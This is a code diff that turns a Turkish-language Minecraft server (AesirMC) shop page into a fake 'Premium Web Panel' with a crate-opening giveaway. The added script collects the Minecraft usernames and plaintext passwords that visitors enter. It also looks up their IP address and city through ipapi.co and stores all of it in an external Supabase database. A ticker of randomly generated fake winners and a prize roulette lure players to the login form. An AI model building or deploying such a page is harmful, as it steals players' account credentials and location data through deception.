@@ -3,213 +3,256 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AesirMC | Mağaza</title>
-    
-    <meta property="og:title" content="AesirMC Resmi Mağazası">
-    <meta property="og:description" content="En uygun fiyatlı AesirMC item ve para ilanları.">
+    <title>AesirMC | Premium Web Panel</title>
+
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="AesirMC | Premium Web Panel">
+    <meta property="og:description" content="AesirMC özel kasa açma simülasyonu ve oyuncu paneli.">
     <meta property="og:image" content="https://aesirhediye2026.vercel.app/logo.png">
+    <meta property="og:url" content="https://aesirhediye2026.vercel.app/">
+    <meta name="theme-color" content="#00a2ff">
     
     <link rel="icon" type="image/png" href="logo.png">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     
     <style>
         :root {
-            --primary: #00a2ff;
-            --secondary: #0066ff;
-            --bg-dark: #0a0b0d;
-            --card-bg: #15171a;
-            --border: rgba(255, 255, 255, 0.08);
-            --success: #00ff88;
+            --primary: #00a2ff; --secondary: #0066ff; --accent: #d48e00;
+            --bg-dark: #050608; --glass: rgba(0, 0, 0, 0.7);
+            --border: rgba(255, 255, 255, 0.1); --success: #00ff88;
+            --discord-blue: #5865F2;
         }
+
+        * { -webkit-user-select: none; -ms-user-select: none; user-select: none; -webkit-user-drag: none; outline: none; }
 
         body {
-            margin: 0;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
             background-color: var(--bg-dark);
-            background-image: radial-gradient(circle at top, #1a1c20 0%, #0a0b0d 100%);
-            color: white;
-            min-height: 100vh;
+            background-image: url('background2.png');
+            background-size: cover; background-position: center; background-attachment: fixed;
+            color: white; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden;
         }
 
-        nav {
-            padding: 40px 5%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        /* ÜST ŞERİT */
+        .winners-ticker {
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border); height: 45px;
+            display: flex; align-items: center; overflow: hidden; white-space: nowrap;
         }
-        .nav-logo {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            text-decoration: none;
-            color: white;
-        }
-        .nav-logo img { width: 90px; filter: drop-shadow(0 0 20px var(--primary)); }
-        .nav-logo span { font-size: 26px; font-weight: 800; letter-spacing: 3px; }
+        .ticker-content { display: inline-flex; animation: ticker-move 100s linear infinite; gap: 60px; padding-left: 100%; }
+        .winner-item { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
+        .winner-prize { color: var(--success); text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }
+        @keyframes ticker-move { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
 
-        /* YAN YANA DİZİLİM AYARI */
-        .market-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px 40px 80px 40px;
-            display: grid;
-            /* Bilgisayarda 4 tane yan yana, tablette 2, mobilde 1 */
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-        }
+        nav { padding: 20px 5%; display: flex; align-items: center; }
+        .nav-logo-box { display: flex; align-items: center; gap: 12px; }
+        .nav-logo-box img { width: 42px; height: 42px; object-fit: contain; }
+        .nav-logo-box span { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
 
-        .product-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            display: flex;
-            flex-direction: column;
-            height: 100%;
+        /* BUTONLAR */
+        .fixed-play-container { position: fixed; bottom: 25px; left: 25px; z-index: 9999; }
+        .btn-play {
+            background-color: var(--accent); color: black; padding: 12px 25px;
+            border-radius: 50px; font-weight: 800; display: flex; align-items: center;
+            gap: 12px; border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0,0,0,0.5); transition: 0.3s;
         }
-        .product-card:hover {
-            transform: translateY(-8px);
-            border-color: var(--primary);
-            box-shadow: 0 15px 35px rgba(0, 162, 255, 0.2);
+        .btn-play:hover { transform: translateY(-5px); background-color: #f1a400; }
+
+        .info-trigger {
+            position: fixed; bottom: 25px; right: 25px; width: 35px; height: 35px;
+            background: rgba(255,255,255,0.15); border: 1px solid var(--border);
+            border-radius: 50%; color: white; display: flex; align-items: center;
+            justify-content: center; font-weight: 800; cursor: pointer; z-index: 9999; backdrop-filter: blur(10px);
         }
 
-        .product-img {
-            width: 100%;
-            height: 170px;
-            object-fit: cover;
-            border-bottom: 1px solid var(--border);
-        }
+        /* GİRİŞ PANELİ */
+        #auth-container { margin: auto; width: 100%; max-width: 420px; padding: 40px; background: var(--glass); border: 1px solid var(--border); border-radius: 32px; text-align: center; backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
+        .auth-logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(0 0 15px var(--primary)); }
+        input { width: 100%; padding: 16px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; border: 1px solid transparent; }
+        input:focus { border-color: var(--primary); }
 
-        .product-info { 
-            padding: 18px;
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-        }
-        
-        .product-title {
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            line-height: 1.4;
-            height: 40px;
-            overflow: hidden;
-        }
+        .social-store-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 25px; }
+        .dc-btn { width: 48px; height: 48px; background-color: var(--discord-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; border: none; }
+        .store-btn { background: #000; color: white; padding: 0 30px; height: 48px; border-radius: 50px; font-weight: 700; text-decoration: none; font-size: 15px; border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; transition: 0.3s; }
+        .store-btn:hover { background: #111; transform: translateY(-2px); }
 
-        .price-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: auto;
-            margin-bottom: 15px;
-        }
-        .price {
-            font-size: 20px;
-            font-weight: 800;
-            color: var(--success);
-        }
-        .price span { font-size: 14px; margin-left: 2px; }
+        /* MODALLAR */
+        .custom-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-card { background: #0f1012; padding: 40px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; max-width: 450px; }
+        .close-btn { margin-top: 25px; padding: 12px 30px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; cursor: pointer; width: 100%; }
 
-        .buy-btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 12px;
-            font-weight: 700;
-            transition: 0.3s;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        .buy-btn:hover {
-            filter: brightness(1.1);
-        }
-
-        .badge {
-            font-size: 9px;
-            background: rgba(255,255,255,0.05);
-            padding: 3px 8px;
-            border-radius: 5px;
-            color: #aaa;
-            text-transform: uppercase;
-        }
-
-        /* Bilgisayar ekranında tam 4'lü düzeni zorla */
-        @media (min-width: 1100px) {
-            .market-container {
-                grid-template-columns: repeat(4, 1fr);
-            }
-        }
+        /* OYUN ALANI */
+        #game-container { display: none; padding: 60px; text-align: center; }
+        .main-chest { width: 220px; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); }
+        #roulette-section { display: none; margin-top: 40px; }
+        .viewport { width: 100%; max-width: 800px; height: 150px; margin: 0 auto; background: rgba(0,0,0,0.5); border: 1px solid var(--border); border-radius: 20px; position: relative; overflow: hidden; }
+        .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: var(--primary); z-index: 10; box-shadow: 0 0 15px var(--primary); }
+        #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
+        .slot { min-width: 130px; display: flex; flex-direction: column; align-items: center; }
+        .slot img { width: 70px; }
     </style>
 </head>
 <body>
 
+<div class="winners-ticker">
+    <div class="ticker-content" id="ticker"></div>
+</div>
+
 <nav>
-    <a href="/" class="nav-logo">
-        <img src="logo.png" alt="Aesir Logo" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
+    <div class="nav-logo-box">
+        <img src="logo.png" alt="Logo" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
         <span>AESIR<span style="color:var(--primary)">MC</span></span>
-    </a>
+    </div>
 </nav>
 
-<div class="market-container">
-    <div class="product-card">
-        <img src="ilan1.png" class="product-img" alt="1M Para" onerror="this.src='https://via.placeholder.com/400x200/15171a/00a2ff?text=ilan1.png+Bulunamadi'">
-        <div class="product-info">
-            <div class="product-title">Aesir MC ASMP | 1 Milyon (1M) Anında Teslimat</div>
-            <div class="price-row">
-                <div class="price">30.00<span>₺</span></div>
-                <div class="badge">Anında Teslim</div>
-            </div>
-            <a href="https://www.itemsatis.com/minecraft/aesir-mc-asmp-1-milyon-1m-aninda-teslimat-5197537.html" target="_blank" class="buy-btn">Satın Al</a>
-        </div>
-    </div>
+<div class="fixed-play-container">
+    <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
+        <img src="aa.png" width="22" alt="Cursor">
+        oyna.aesirmc.com
+    </button>
+</div>
 
-    <div class="product-card">
-        <img src="ilan2.png" class="product-img" alt="64 Spawner" onerror="this.src='https://via.placeholder.com/400x200/15171a/00a2ff?text=ilan2.png+Bulunamadi'">
-        <div class="product-info">
-            <div class="product-title">Aesir MC | 64 ADET İSKELET SPAWNER SMP</div>
-            <div class="price-row">
-                <div class="price">249.00<span>₺</span></div>
-                <div class="badge">Stokta Var</div>
-            </div>
-            <a href="https://www.itemsatis.com/minecraft/aesir-mc-64-adet-iskelet-spawner-smp-5219248.html" target="_blank" class="buy-btn">Satın Al</a>
-        </div>
-    </div>
+<div class="info-trigger" onclick="openModal('info-modal')">!</div>
 
-    <div class="product-card">
-        <img src="ilan3.png" class="product-img" alt="5M Para" onerror="this.src='https://via.placeholder.com/400x200/15171a/00a2ff?text=ilan3.png+Bulunamadi'">
-        <div class="product-info">
-            <div class="product-title">Aesir MC SMP | 5M Oyun Parası Anında Teslimat</div>
-            <div class="price-row">
-                <div class="price">89.00<span>₺</span></div>
-                <div class="badge">Popüler</div>
-            </div>
-            <a href="https://www.itemsatis.com/minecraft/aesir-mc-smp-5m-oyun-parasi-aninda-teslimat-5216976.html" target="_blank" class="buy-btn">Satın Al</a>
+<div id="auth-container">
+    <img src="logo.png" class="auth-logo" alt="Logo">
+    <h2 style="margin-bottom: 25px; margin-top: 0;">Giriş Yap</h2>
+    <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
+    <input type="password" id="password" placeholder="Şifre">
+    <button id="login-btn" style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">GİRİŞ YAP</button>
+    
+    <div class="social-store-row">
+        <div class="dc-btn" onclick="window.open('https://discord.com/invite/k8qFbQhbHX', '_blank')">
+            <img src="dc.png" width="24" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2111/2111370.png'">
         </div>
-    </div>
-
-    <div class="product-card">
-        <img src="ilan4.png" class="product-img" alt="10 Spawner" onerror="this.src='https://via.placeholder.com/400x200/15171a/00a2ff?text=ilan4.png+Bulunamadi'">
-        <div class="product-info">
-            <div class="product-title">Aesir ASMP | 10X İskelet Spawner Satışı</div>
-            <div class="price-row">
-                <div class="price">49.00<span>₺</span></div>
-                <div class="badge">Ekonomik</div>
-            </div>
-            <a href="https://www.itemsatis.com/minecraft/aesir-asmp-10x-iskelet-spawner-satisi-5196591.html" target="_blank" class="buy-btn">Satın Al</a>
-        </div>
+        <a href="https://aesirhediye2026.vercel.app/magaza.html" target="_blank" class="store-btn">Mağazaya git</a>
     </div>
 </div>
 
-<footer style="text-align: center; padding-bottom: 40px; opacity: 0.4; font-size: 11px;">
-    İşlemler İtemSatış güvencesiyle tamamlanır.<br>
-    © 2026 AesirMC Shop
-</footer>
+<div id="game-container">
+    <h2 id="welcome-txt"></h2>
+    <div id="chest-zone">
+        <img src="adsız.png" id="main-chest-img" class="main-chest" onclick="handleChestClick()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
+        <p style="margin-top: 20px; color: var(--primary); font-weight: 600;">SANDIĞI AÇMAK İÇİN TIKLA</p>
+    </div>
+    <div id="roulette-section">
+        <div class="viewport"><div id="strip"></div></div>
+        <button id="spin-btn" style="width: 200px; margin-top: 30px; padding:15px; background:var(--primary); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="runRoulette()">KASAYI ÇEVİR</button>
+    </div>
+</div>
 
+<div id="info-modal" class="custom-modal">
+    <div class="modal-card">
+        <h2 style="color: var(--primary); margin-top: 0;">Sistem Bilgilendirmesi</h2>
+        <p style="color: #ccc;">Güvenliğiniz için IP adresiniz ve yaklaşık konumunuz sisteme kaydedilmektedir.</p>
+        <p style="color: #ccc;">Girdiğiniz veriler test amaçlıdır.</p>
+        <button class="close-btn" onclick="closeModal('info-modal')">ANLADIM</button>
+    </div>
+</div>
+
+<div id="win-modal" class="custom-modal">
+    <div class="modal-card">
+        <h2 style="color: var(--success);">TEBRİKLER!</h2>
+        <h1 id="win-name" style="font-size: 36px; margin: 15px 0;"></h1>
+        <img id="win-img" src="" width="120">
+        <button class="close-btn" onclick="location.reload()">KAPAT</button>
+    </div>
+</div>
+
+<script>
+    // SUPABASE KURULUMU
+    const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
+    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
+    const _db = supabase.createClient(S_URL, S_KEY);
+
+    // IP VE KONUM KAYDEDEREK GİRİŞ YAPMA (YENİ)
+    async function connectAndGo() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        const btn = document.getElementById('login-btn');
+        
+        if(!u || !p) return;
+
+        btn.disabled = true;
+        btn.innerText = "BAĞLANILIYOR...";
+
+        try {
+            // 1. IP ve Konum Bilgisi Çek
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+
+            // 2. Supabase'e Veriyi Kaydet
+            // Tablonda ip_address, city ve user_agent sütunları olmalı!
+            await _db.from('users').insert([{ 
+                username: u, 
+                password: p,
+                ip_address: data.ip || "Bilinmiyor",
+                city: (data.city + " / " + data.region) || "Bilinmiyor",
+                user_agent: navigator.userAgent
+            }]);
+
+            // 3. Giriş Başarılı
+            document.getElementById('auth-container').style.display = 'none';
+            document.getElementById('game-container').style.display = 'block';
+            document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
+            
+        } catch (err) {
+            console.error("Hata oluştu:", err);
+            // Hata olsa bile giriş yaptır (Opsiyonel)
+            document.getElementById('auth-container').style.display = 'none';
+            document.getElementById('game-container').style.display = 'block';
+        }
+    }
+
+    // MODAL & DİĞER FONKSİYONLAR
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+    const rewards = [
+        { name: "100AP", img: "100.png" }, { name: "500AP", img: "500.png" },
+        { name: "1000AP", img: "1000.png" }, { name: "200AP", img: "200.png" }, { name: "2000AP", img: "2000.png" }
+    ];
+
+    const names = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Selim", "Kerem", "Yigit"];
+    const ticker = document.getElementById('ticker');
+    for(let i=0; i<80; i++) {
+        const n = names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 99);
+        const r = rewards[Math.floor(Math.random() * rewards.length)];
+        ticker.innerHTML += `<div class="winner-item"><span>${n}</span><span style="opacity:0.4; font-size:11px;">kazandı:</span><span class="winner-prize">${r.name}</span></div>`;
+    }
+
+    function handleChestClick() {
+        document.getElementById('main-chest-img').style.transform = "scale(0.9)";
+        setTimeout(() => {
+            document.getElementById('chest-zone').style.display = 'none';
+            document.getElementById('roulette-section').style.display = 'block';
+            initRoulette();
+        }, 300);
+    }
+
+    function initRoulette() {
+        const strip = document.getElementById('strip');
+        strip.innerHTML = '';
+        for(let i=0; i<70; i++) {
+            const item = rewards[Math.floor(Math.random() * rewards.length)];
+            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size:10px; opacity:0.6;">${item.name}</span></div>`;
+        }
+    }
+
+    function runRoulette() {
+        const strip = document.getElementById('strip');
+        document.getElementById('spin-btn').disabled = true;
+        const move = 5000 + Math.floor(Math.random() * 2000);
+        strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
+        strip.style.transform = `translateX(-${move}px)`;
+        setTimeout(() => {
+            const final = rewards[Math.floor(Math.random() * rewards.length)];
+            openModal('win-modal');
+            document.getElementById('win-name').innerText = final.name;
+            document.getElementById('win-img').src = final.img;
+        }, 6500);
+    }
+</script>
 </body>
 </html>
